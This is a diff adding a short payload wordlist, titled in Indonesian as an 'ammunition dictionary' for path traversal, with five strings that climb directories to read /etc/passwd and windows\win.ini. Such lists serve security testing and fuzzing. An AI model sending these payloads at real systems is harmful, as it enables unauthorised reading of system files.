@@ -1,0 +1,6 @@
+# === KAMUS AMUNISI V8: PATH TRAVERSAL ===
+../../../../etc/passwd
+../../../../../../../../etc/passwd
+..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\windows\win.ini
+/etc/passwd
